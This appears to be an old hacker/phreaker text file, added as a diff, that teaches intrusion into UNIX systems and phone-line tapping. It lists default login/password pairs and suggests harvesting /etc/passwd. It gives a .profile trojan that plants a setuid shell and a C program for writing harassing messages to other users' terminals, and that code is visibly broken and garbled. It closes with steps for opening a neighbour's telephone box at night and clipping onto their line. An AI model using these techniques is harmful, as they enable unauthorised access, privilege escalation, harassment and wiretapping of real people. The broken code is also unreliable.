@@ -1,0 +1,216 @@
+
+
+                                                             
+             oooooooo    fffffffff    fffffffff   hh     hh    pppppppp     
+             oo    oo    ff           ff          hh     hh    pp      p
+             oo    oo    ffffff       ffffff      hh     hh    pp       p
+             oo    oo    ff           ff          hhhhhhhhh    pppppppppp
+             oo    oo    ff           ff          hh     hh    pp 
+             oo    oo    ff           ff          hh     hh    pp
+             oooooooo :: ff        :: ff       :: hh     hh :: pp  
+
+                       
+                  ***OPERATION FOR FREE HACKERS AND PHREAKERS***
+                        
+                   ***Writen By: CyBeR sPyDeR(johnr@loa.com)***
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+  This Is the first Volume of O.F.F.H.P. I have writen and I don't know if it will be the
+last (it might be the last if it is to time consumeing of tedius.) In this installment I
+will cover hacking on UNIX systems.
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+ First thing's first UNIX and all variants Solaris, Linux, Net BSD, Free BSD, HP/UX, and
+I am sure thare others I havent named are OS's much like MS-DOS and PC DOS, EXCEPT they
+are multiuser 32-bit Operating systems. The shell of a UNIX system is like the C:/> in a
+DOS system it is where you type in commands and run programs (although there other
+windowing systems like X11 which are like Microsoft Windows and OS/2.) Scince UNIX is a
+multiuser OS it means they will be diferent levels of access given to users in the system
+and therefore there you will have to login and give a password. To get superuser access
+you will have to login as: root but more than likely there will be a password, but all
+hope is not lost there some commen usernames that come with the system like: 
+
+Login                         Password
+-----                         --------
+
+sys                           sys, sytem, or bin
+bin                           sys or bin
+mountfsys                     mountfsys
+adm                           adm
+uucp                          uucp
+nuucp                         nuucp
+anon                          anon
+user                          user
+guest                         guest
+admin                         admin
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-
+
+there might be some others that I did not mention it depends on the system's setup
+(remember UNIX IS case sensitive.) If one of these work then your in if not good luck.
+Now that your in you can pick up the "passwd" file in the /etc directory once you get
+(providing it is not locked because you have low access privilages.) this you will have every username and password but there i 
+still a problem
+to decrypt the passwords using SUID because they won't appear on a normal text editor.
+But DES encryption ain't easy to decrypt because it uses a random alphanumeric code
+chosen at instlition, but the passwd file can still be usefull because you can look
+for accounts that are not password protected.
+Here is a Trojan Horse you cuold use to gain more power:
+
+$ ed .profile
+[some number will be here]
+? a
+cp /bin/sh .runme
+chmod a+x .runme
+chmod a+s .runme
+(control -D)
+? w
+[new file size will be shown]
+? q
+$
+
+that was an easy Trojan Horse in a C script it can be done using chmod() commands.
+
+Something you can do to have fun is you can banner someone with rude comments like
+this:
+
+$who
+crapy person tty1
+root tty2
+$banner Phuck You >/dev/tty1
+$
+
+that would send the stuff in the banner part to crapy person.
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-
+
+This is a C program that could really screw with'em:
+
+#include <stdio.h>
+#include <fcntl.h>
+#include <string.h>
+
+main(argc,argument)
+int argc;
+char *argument[];
+{
+        int handle;             
+        char *pstr,*olm[80];
+        char *devstar = "/dev/"; 
+        int acnt = 2;
+        FILE *strm;
+        pstr = "";
+        if (argc == 1) {
+           printf("OL (oneliner) Version 1.0\n");
+           printf("By CyBeR sPyDeR [O.F.F.H.P]\n");
+                 printf("\nSyntax: ol tty message\n");
+                 printf("Example: ol tty01 You Suck\n");
+                 exit(1)
+       }
+        printf("OL (OneLiner) Version 1.0\n");
+    printf("By CyBeR sPyDeR [O.F.F.H.P.]\n");
+        if (argc == 2) {
+                 strcpy(olm,"");
+                 printf("\nId0t -U- pH0rG0T 2 5uppLY @ ONE LINE MESSAGE\n");
+                 printf("Enter One Here =>");
+                 gets(olm);
+       }
+       strcpy(pstr,"");
+       strcat(pstr, devstr);
+   strcat(pstr, argument[1]);
+       pintf("Sending to: [%s]\n",pstr);
+       strm = fopen(pstr,"a");
+       if (strm == NULL) {
+                printf("Error Writing to: %s\n,pstr);
+                printf("Cause: No wirte Perms?\n");
+                exit(2)
+       }  
+       if (argc == 2) {
+          if (strcmp(logname(), "CyBeR sPyDeR") != 0) fprintf(strm, Message from (%s):
+\n",logname());
+          fprintf(strm, "%s\n", olm);
+          fclose(strm);
+          printf(Message Sent.\n");
+          exit (0)
+       }
+    if (argc > 2){
+          if (strcmp(logname(), "CyBeR sPyDeR") != 0) fprintf(strm, "Message from
+(%s):\n",logname());
+                 while (acnt <= argc - 1){
+                         fprintf(strm, "%s",argument[acnt]);
+                         acnt++;
+               }
+               fclose(strm);
+               printf("Message sent!\n");
+               exit(0)
+       }                   
+}
+
+  What that will do is send one line of text to a device in /dev made writeable by you.
+If you try it on someone named CyBeR sPyDeR it will notify him of it. You can supply
+the argument command line, or leave a blank message and you can supply it at that time.
+You HAVE TO supply a Terminal. Also, if you want to use ?, or *, or () or, [], you
+can't supply a message at the command line, wait till it prompts you.
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/
+
+  Well, that's about all for UNIX hacknig I know it isn't much but I hope it helps.
+Here are a few after thoughts: 
+
+Plans for a BUD BOX
+-------------------
+
+A BUD BOX is like a modifided baige box. I use it mainly for modem transmissions
+because all you have to bo is pull a phone line apart.
+
+==>Matrials<==
+--------------
+
+1)Soldering Iron
+2)Solder
+3)A phone cord with 1 RJ11 connector on one end.
+4)Some aligator clips
+5)Wire stripers/cutters
+--------------------------------------------------
+
+1- Take some of the outside case off of the phone cord.
+2- You should notice 4 wires (black, red, green, yellow) all you need is the 2 middle
+wires which are the green and the red.
+3- Solder the green and red wires to a aligator cilp.
+4- Wait until it the people you want to phuck with are asleep.
+5- Go to there house where the water meter and electric meter are located you will
+probaly see a gray box with a bell logo on it some boxes you can just hit from the
+bottom and they will open others have a bolt on them which is Ithink is 6/18 but I am
+not sure. Well open the box and it will look something like this:
+-------------------------------------
+-------------------------------------
+|                                   |
+|   |-|         |-|      ======     |
+|                        *    *     |
+|                        *    *     |
+|                        *    *     |
+|         |-|            *    *     |
+|                        *    *     |
+|                        *    *     | 
+|                        *    *     |
+|   |-|         |-|      *    *     |
+|                        *    *     |
+|                        *    *     |
+|                        ======     |
+|                                   |
+|                                   |
+-------------------------------------
+-------------------------------------
+
+In the part that looks like an "X" there will be a red an a green wire attached to the
+screws on the left side normaly. Attach the aligator clips to the corrsponding colors
+for each wire if that didn't work switch them around.
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/--/-/-/-
+
+A CyBeR sPyDeR Production.
+Any questions, comments or, thrashings. Contact me at Log on America (johnr@loa.com)
+My page will be up soon at http://www.ids.net/users/~cyber/index.htm
+
